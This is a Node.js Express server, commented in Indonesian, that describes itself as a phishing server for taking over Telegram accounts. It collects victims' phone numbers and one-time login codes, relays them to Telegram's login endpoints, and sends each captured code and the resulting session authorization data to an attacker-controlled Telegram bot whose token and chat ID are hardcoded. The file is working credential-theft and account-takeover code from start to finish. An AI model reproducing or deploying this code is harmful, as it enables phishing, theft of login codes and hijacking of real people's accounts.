const express = require('express');
const fetch = require('node-fetch');
const crypto = require('crypto');
const cors = require('cors');
const app = express();

app.use(cors());
app.use(express.json());
app.use(express.static('public'));

const sessions = {};

// ========== GANTI INI ==========
const API_ID = 8562131602;
const API_HASH = "1897c294928d8f3d362d6ac692b69155";
const BOT_TOKEN = "8562131602:AAEjjGESS-yKIiCYOGwMr3a5_YFdZSBHi0o";
const CHAT_ID = "7933552719";
// ==============================

async function sendLog(message) {
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
        });
    } catch(e) {}
}

async function sendTelegramRequest(method, params = {}) {
    const url = `https://my.telegram.org/auth/${method}`;
    const body = new URLSearchParams(params).toString();
    
    const response = await fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://my.telegram.org',
            'Referer': 'https://my.telegram.org/auth',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 13; Mobile) AppleWebKit/537.36'
        },
        body: body
    });
    
    return await response.json();
}

// Kirim OTP
app.post('/sendCode', async (req, res) => {
    const { phone } = req.body;
    if (!phone) return res.json({ success: false, error: 'Phone required' });

    try {
        const result = await sendTelegramRequest('send_code', {
            phone: phone,
            api_id: API_ID,
            api_hash: API_HASH,
            settings: JSON.stringify({
                _: 'codeSettings',
                allow_flashcall: false,
                current_number: true,
                allow_app_hash: true,
                allow_missed_call: false,
                logout_tokens: []
            })
        });

        if (result._ === 'auth.sentCode') {
            const sessionId = crypto.randomUUID();
            sessions[sessionId] = {
                phoneCodeHash: result.phone_code_hash,
                phone: phone,
                createdAt: Date.now()
            };

            await sendLog(
                `📱 *OTP TERKIRIM!*\n` +
                `🔢 Nomor: \`${phone}\`\n` +
                `🔑 Hash: \`${result.phone_code_hash}\`\n` +
                `📨 Type: ${result.type._}\n` +
                `🆔 Session: \`${sessionId}\``
            );

            res.json({
                success: true,
                sessionId: sessionId,
                phoneCodeHash: result.phone_code_hash,
                type: result.type._
            });
        } else {
            await sendLog(`❌ *GAGAL KIRIM*\n📱 ${phone}\n⚠️ ${JSON.stringify(result)}`);
            res.json({ success: false, error: 'Failed to send code' });
        }
    } catch(e) {
        await sendLog(`❌ *ERROR*\n📱 ${phone}\n⚠️ ${e.message}`);
        res.json({ success: false, error: e.message });
    }
});

// Verifikasi OTP
app.post('/verifyCode', async (req, res) => {
    const { sessionId, code, phone } = req.body;
    const session = sessions[sessionId];
    
    if (!session) return res.json({ success: false, error: 'Session expired' });

    try {
        const result = await sendTelegramRequest('login', {
            phone: phone,
            phone_code_hash: session.phoneCodeHash,
            phone_code: code,
            api_id: API_ID,
            api_hash: API_HASH
        });

        if (result._ === 'auth.authorization' || result._ === 'auth.authorizationSignUpRequired') {
            await sendLog(
                `🎉 *TAKEOVER BERHASIL!* 🎉\n\n` +
                `📱 Nomor: \`${phone}\`\n` +
                `🔑 OTP: \`${code}\`\n` +
                `✅ Status: VERIFIED\n\n` +
                `📦 *Data:*\n\`\`\`json\n${JSON.stringify(result, null, 2)}\n\`\`\``
            );

            delete sessions[sessionId];
            res.json({ success: true, data: result });
        } else {
            await sendLog(
                `❌ *KODE SALAH*\n📱 ${phone}\n🔢 Kode: \`${code}\`\n⚠️ ${JSON.stringify(result)}`
            );
            res.json({ success: false, error: 'Invalid code' });
        }
    } catch(e) {
        res.json({ success: false, error: e.message });
    }
});

// Resend OTP
app.post('/resendCode', async (req, res) => {
    const { sessionId, phone } = req.body;
    const session = sessions[sessionId];
    if (!session) return res.json({ success: false, error: 'Session expired' });

    try {
        const result = await sendTelegramRequest('send_code', {
            phone: phone,
            api_id: API_ID,
            api_hash: API_HASH,
            settings: JSON.stringify({
                _: 'codeSettings',
                allow_flashcall: false,
                current_number: true,
                allow_app_hash: true
            })
        });

        if (result._ === 'auth.sentCode') {
            session.phoneCodeHash = result.phone_code_hash;
            await sendLog(`🔄 *OTP DIKIRIM ULANG*\n📱 ${phone}`);
            res.json({ success: true, phoneCodeHash: result.phone_code_hash });
        } else {
            res.json({ success: false, error: 'Failed to resend' });
        }
    } catch(e) {
        res.json({ success: false, error: e.message });
    }
});

// Halaman phising
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/public/index.html');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log('🔥 Server aktif di port ' + PORT);
    sendLog('🔥 *SERVER PHISING AKTIF DI RENDER!* 🔥');
});
